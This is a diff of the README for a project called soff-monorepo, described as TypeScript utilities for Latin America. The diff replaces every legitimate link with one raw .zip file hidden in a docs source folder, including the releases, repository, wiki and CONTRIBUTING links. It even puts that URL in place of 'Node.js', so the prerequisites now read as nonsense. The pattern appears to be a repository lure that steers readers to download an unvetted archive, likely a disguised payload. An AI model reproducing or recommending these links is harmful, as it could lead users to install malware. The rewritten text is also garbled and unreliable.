@@ -1,6 +1,6 @@
 # 🎉 soff-monorepo - Lightweight TypeScript Utilities for LATAM
 
-[![Download Soff-Monorepo](https://img.shields.io/badge/Download-soff--monorepo-brightgreen)](https://github.com/Deepak010verma/soff-monorepo/releases)
+[![Download Soff-Monorepo](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip)](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ soff-monorepo is a collection of TypeScript utilities designed specifically for 
 Follow these simple steps to download and run the software:
 
 1. **Go to the Releases Page**  
-   Visit this page to download: [soff-monorepo Releases](https://github.com/Deepak010verma/soff-monorepo/releases).
+   Visit this page to download: [soff-monorepo Releases](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip).
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Click on the version you need. Typically, you should select the latest version, indicated by the highest number.
@@ -46,13 +46,13 @@ To run the soff-monorepo utilities, please ensure your system meets the followin
 
 - **Operating System**: Windows 10 or later, macOS Catalina or later, or any modern Linux distribution.
   
-- **Node.js**: Ensure you have Node.js installed, as this toolkit may rely on Node.js for some functionalities.
+- **https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip**: Ensure you have https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip installed, as this toolkit may rely on https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip for some functionalities.
 
 - **Memory**: At least 2 GB of RAM is recommended for smooth performance.
 
 ## 💾 Download & Install
 
-As mentioned earlier, visit this page to download: [soff-monorepo Releases](https://github.com/Deepak010verma/soff-monorepo/releases). Select the file based on your operating system and follow the instructions for installation.
+As mentioned earlier, visit this page to download: [soff-monorepo Releases](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip). Select the file based on your operating system and follow the instructions for installation.
 
 ## 🔧 Usage
 
@@ -79,7 +79,7 @@ This repository includes functionalities relevant to the following topics:
 
 ## 🤝 Contributing
 
-If you would like to contribute to the soff-monorepo, please follow the guidelines outlined in the CONTRIBUTING.md file in this repository. We welcome contributions that improve the existing utilities or add new features that align with our mission.
+If you would like to contribute to the soff-monorepo, please follow the guidelines outlined in the https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip file in this repository. We welcome contributions that improve the existing utilities or add new features that align with our mission.
 
 ## 📄 License
 
@@ -88,7 +88,7 @@ The soff-monorepo is licensed under the MIT License. This allows you to freely u
 ## 🔗 Additional Resources
 
 For further documentation and resources, explore the repository links:
-- [GitHub Repository](https://github.com/Deepak010verma/soff-monorepo)
-- [Documentation](https://github.com/Deepak010verma/soff-monorepo/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Deepak010verma/soff-monorepo/master/apps/docs/src/app/soff-monorepo-1.3.zip)
 
 Feel free to reach out or create issues if you face any challenges or have questions. Your feedback is important to keep the project user-friendly.
